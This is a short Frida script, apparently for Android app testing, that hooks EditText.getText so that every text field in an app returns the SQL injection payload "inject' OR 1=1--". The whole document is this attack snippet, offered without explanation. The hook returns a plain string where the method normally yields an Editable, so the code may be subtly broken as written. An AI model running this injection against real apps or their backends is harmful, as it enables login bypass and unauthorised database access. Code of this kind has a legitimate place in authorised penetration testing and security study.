Java.perform(() => {  
  let EditText = Java.use("android.widget.EditText");  
  EditText.getText.implementation = () => "inject' OR 1=1--";  
}); 
